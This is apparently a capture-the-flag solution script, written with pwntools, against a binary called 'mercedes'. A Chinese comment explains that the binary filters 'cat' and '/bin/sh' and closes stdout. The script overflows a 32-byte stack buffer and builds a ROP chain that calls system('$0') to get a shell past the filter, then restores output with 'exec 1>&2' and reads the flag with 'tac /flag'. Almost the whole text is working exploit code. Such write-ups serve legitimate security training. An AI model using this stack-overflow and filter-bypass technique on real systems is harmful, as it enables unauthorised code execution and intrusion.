"""mercedes
info中会检测 cat 及 [bin/sh], 不能为里面的任意值
close(1)

  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
  read(0, info, 0xEuLL);
  read(0, buf, 0x48uLL);
"""
from pwn import *

s = process("./mercedes")
# remote_addr = "10.1.100.15"
context(log_level='info', arch='amd64', os='linux')

elf = ELF("mercedes")

system_addr = elf.plt["system"]
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]
info = elf.sym['info']

s.sendline("$0")

payload = flat("a" * 40, pop_rdi, info, ret, system_addr)
s.sendline(payload)
s.sendline('exec 1>&2')
s.sendline('tac /flag')
s.interactive()
